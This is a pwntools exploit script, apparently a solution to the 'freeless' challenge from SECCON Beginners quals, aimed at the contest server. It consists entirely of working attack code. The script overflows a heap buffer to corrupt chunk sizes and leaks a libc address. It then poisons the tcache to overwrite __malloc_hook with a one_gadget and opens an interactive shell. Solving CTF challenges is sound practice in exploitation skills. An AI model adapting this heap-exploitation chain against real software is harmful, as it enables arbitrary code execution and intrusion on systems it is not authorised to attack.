from pwn import *

# p = remote('localhost', 7777)
# p = process('chall')
p = remote('freeless.quals.beginners.seccon.jp', 9077)
e = ELF('chall')
libc = ELF('libc-2.31.so')

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]

def new(i, size):
    p.sendlineafter('> ', '1')
    p.sendlineafter(': ', str(i))
    p.sendlineafter(': ', str(size))

def edit(i, data):
    p.sendlineafter('> ', '2')
    p.sendlineafter(': ', str(i))
    p.sendlineafter(': ', data)

def show(i):
    p.sendlineafter('> ', '3')
    p.sendlineafter(': ', str(i))
    p.recvuntil('data: ')
    return p.recvline()

new(0, 0x10)
edit(0, b'A' * 0x18 + p64(0xd51))
new(1, 0xd30)
new(2, 0xd20)

libc.address = u64(show(2)[:-1].ljust(8, b'\x00')) - 0x1ebbe0
print(hex(libc.address))

edit(1, b'A' * 0xd38 + p64(0x2c1))
new(3, 0xd30)
edit(3, b'A' * 0xd38 + p64(0x2c1))
new(4, 0x2a0)
edit(3, b'A' * 0xd38 + p64(0x2a1) + p64(libc.symbols['__malloc_hook']))

new(5, 0x290)
new(6, 0x290)
edit(6, p64(libc.address + one_gadget[1]))

new(7, 0)

p.interactive()
